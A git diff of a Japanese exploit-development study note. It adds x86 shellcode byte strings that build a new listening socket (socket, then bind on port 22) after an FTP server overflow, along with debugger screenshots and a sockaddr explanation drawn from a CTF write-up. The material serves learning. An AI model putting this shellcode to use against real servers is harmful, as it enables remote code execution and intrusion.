@@ -2163,6 +2163,7 @@ s.close()
 FTPサーバーなどが対象の場合、攻撃者とソケットが作成されておりそのソケットを使用して`s.recv`で追加のPayloadを注入するが、クライアント側から`s.close`でソケットを閉じないとEIPを操作できない(Stack上コード実行が始まらない)場合、ソケットの再利用ができない。   
 その場合は新たにソケットを`socket(),bind(),listen(),accept,recv()`の順に作成すれば解決する！   
 例）https://buffered.io/posts/idsecconf-2013-myftpd-challenge/   
+**socket()**   
 ```txt
   block1 = ""
   # Adjust the stack to prevent it from breaking things in our shellcode
@@ -2182,23 +2183,57 @@ FTPサーバーなどが対象の場合、攻撃者とソケットが作成さ�
   block1 += "\x50"                               # PUSH EAX
   # invoke the call to `socket`
   block1 += "\xFF\xD3"                           # CALL EBX  socket(2,1,6)を実行！
+                                                   多分大体はこの設定でよさそう？？
 ```
 ![image](https://user-images.githubusercontent.com/56021519/90307721-f2da8000-df13-11ea-95d8-a5b2a5d08b84.png)
-![image](https://user-images.githubusercontent.com/56021519/90307767-73997c00-df14-11ea-96da-870c673f139e.png)
+![image](https://user-images.githubusercontent.com/56021519/90307767-73997c00-df14-11ea-96da-870c673f139e.png)   
+実行後のレジスタ   
+![image](https://user-images.githubusercontent.com/56021519/90307901-ca538580-df15-11ea-9003-d4ecdac04e44.png)
+**bind()**   
 ```txt
 # bind()   socket登録
            生成したソケットにポート番号など割り当て
            int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 
+  # save our socket handle
+  block1 += "\x89\xC7"                           # MOV EDI, EAX  0x84がsocket file descriptor
+  # Find sockaddr
+  block1 += "\x89\xD9"                           # MOV ECX, EBX
+  block1 += "\xB5\x74"                           # MOV CH, 0x74  ECXにはport番号とIPアドレスが格納されているsockaddr構造体のアドレスを指定
+  # adjust the port number by bumping it up one to 22
+  block1 += "\xFE\x41\x03"                       # INC BYTE [ECX+3]
+  # adjust the call pointer to reference bind
+  block1 += "\xB3\x54"                           # MOV BL, 0x54
+  # prepare the parameters on the stack for the bind call
+  block1 += "\x6A\x10"                           # PUSH 0x10
+  block1 += "\x51"                               # PUSH ECX
+  block1 += "\x50"                               # PUSH EAX
+  # invoke the call to `bind`
+  block1 += "\xFF\xD3"                           # CALL EBX
 ```
-
+sockaddr構造体のポート番号21から22に変更   
+![image](https://user-images.githubusercontent.com/56021519/90308006-bb210780-df16-11ea-99c8-1149b10629a5.png)
+![image](https://user-images.githubusercontent.com/56021519/90308026-e277d480-df16-11ea-803a-797afeaa5296.png)   
+![image](https://user-images.githubusercontent.com/56021519/90308043-063b1a80-df17-11ea-8aa2-3e7514a79417.png)
+![image](https://user-images.githubusercontent.com/56021519/90308053-1652fa00-df17-11ea-87c3-b82035921397.png)   
+ここで、sockaddr構造体は以下のようになっているため、ホスト側のポート0x15,IPは0x0(0.0.0.0的な意味？)、クライアント側のポート0xd04a,IPは0xc0a83805(192.168.56.5)という意味っぽい。   
+この構造体を探すにはIPアドレスをメモリ上で探せばよさそう(??)   
+```txt
+struct sockaddr_in {
+    short          sin_family;  // 2bytes
+    u_short        sin_port;    // 2bytes 　port番号
+    struct in_addr sin_addr;    // 4bytes 　IPアドレス
+    char           sin_zero[8]; // 8bytes
+};
+```
+**listen()**   
 ```txt
 # listen() ソケット接続準備
            通信接続を待つための準備作業
            int listen(int sockfd, int backlog);
       
 ```
-
+**accept()**   
 ```txt
 # accept() ソケット接続待機
            クライアント側からの通信接続を待つ。サーバ側プログラムが accept()を実行すると、
@@ -2206,7 +2241,7 @@ FTPサーバーなどが対象の場合、攻撃者とソケットが作成さ�
            int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
       
 ```
-
+**recv()**   
 ```txt
 # recv()   データ受信
 　　　　　　ssize_t read(int fd, void *buf, size_t count);
